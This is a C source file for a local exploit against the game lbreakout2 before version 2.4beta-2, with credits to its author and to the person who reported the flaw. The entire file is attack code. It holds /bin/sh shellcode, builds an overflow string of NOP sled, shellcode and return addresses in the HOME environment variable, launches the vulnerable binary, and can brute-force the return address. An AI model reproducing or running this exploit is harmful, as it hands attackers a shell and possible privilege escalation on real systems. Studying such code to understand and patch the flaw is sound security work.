/* 
 * lbreakout2 < 2.4beta-2 local exploit by Li0n7@voila.fr
 * vulnerability reported by Ulf Harnhammar <Ulf.Harnhammar.9485@student.uu.se>
 * usage: ./lbreakout2-exp [-r <RET>][-b [-s <STARTING_RET>]]
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <errno.h>

#define BSIZE 200
#define D_START 0xbfffffff
#define PATH "/usr/local/bin/lbreakout2"

void exec_vuln();
int tease();
int make_string(long ret_addr);
int bruteforce(long start);
void banner(char *argv);

char shellcode[]=
      "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
      "\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

char *buffer,*ptr;

int 
main(int argc,char *argv[])
{
      char * option_list = "br:s:";
      int option,brute = 0,opterr = 0;
      long ret,start = D_START;

      if (argc < 2) banner(argv[0]);

      while((option = getopt(argc,argv,option_list)) != -1)
          switch(option)
          {
              case 'b':
                  brute = 1;
                  break;
              case 'r':
                  ret = strtoul(optarg,NULL,0);
                  make_string(ret);
                  tease();
                  exit(1);
                  break;
              case 's':
                  start = strtoul(optarg,NULL,0);
                  break;
              case '?':
                  fprintf(stderr,"[-] option \'%c\' invalid\n",optopt);
                  banner(argv[0]);
                  exit(1);
          }

      if(brute) 
          bruteforce(start);

      return 0;
}

void 
exec_vuln()
{
      execl(PATH,PATH,NULL);
}

int 
tease()
{
      pid_t pid;
      pid_t wpid;
      int status;

      pid = fork();

      if (pid == -1)
      {
          fprintf(stderr, "[-] %s: Failed to fork()\n",strerror(errno));
          exit(13);
      } 
      else if (pid == 0)
      {
          exec_vuln();
      } 
      else  
      {
          wpid = wait(&status);
          if (wpid == -1)
          {
              fprintf(stderr,"[-] %s: wait()\n",strerror(errno));
              return 1;
          } 
          else if (wpid != pid)
              abort();
          else 
          {
              if (WIFEXITED(status))
              {
                  fprintf(stdout,"[+] Exited: shell's ret code = %d\n",WEXITSTATUS(status));
                  return WEXITSTATUS(status);
              } 
              else if (WIFSIGNALED(status))
                  return WTERMSIG(status);  
              else 
                  fprintf(stderr,"[-] Stopped.\n");
          }
      }
      return 1;
}

int 
make_string(long ret_addr)
{
      int i;
      long ret,addr,*addr_ptr;    
      
      buffer = (char *)malloc(1024);
      if(!buffer)
      {
          fprintf(stderr,"[-] Can't allocate memory\n");
          exit(-1);
      }

      ret = ret_addr;

      ptr = buffer;

      memset(ptr,0x90,BSIZE-strlen(shellcode));
      ptr += BSIZE-strlen(shellcode);

      memcpy(ptr,shellcode,strlen(shellcode));
      ptr += strlen(shellcode);

      addr_ptr = (long *)ptr;
      for(i=0;i<200;i++)
          *(addr_ptr++) = ret;
      ptr = (char *)addr_ptr;
      *ptr = 0;
  
      setenv("HOME",buffer,1);
      return 0;
}

int 
bruteforce(long start)
{
      int ret;
      long i;

      fprintf(stdout,"[+] Starting bruteforcing...\n");
 
      for(i=start;i<0;i=i-50) 
      {
          fprintf(stdout,"[+] Testing 0x%x...\n",i);
          make_string(i);
          ret=tease();
          if(ret==0)
          {
              fprintf(stdout,"[+] Ret address found: 0x%x\n",i);
              break;
          }
      }
      
      return 0;
}

void 
banner(char *argv)
{
      fprintf(stderr,"lbreakout2 < 2.4beta-2 local exploit by Li0n7@voila.fr\n");
      fprintf(stderr,"vulnerability reported by Ulf Harnhammar <Ulf.Harnhammar.9485@student.uu.se>\n");
      fprintf(stderr,"usage: %s [-r <RET>][-b [-s <STARTING_RET>]]\n",argv);
      exit(1);
}

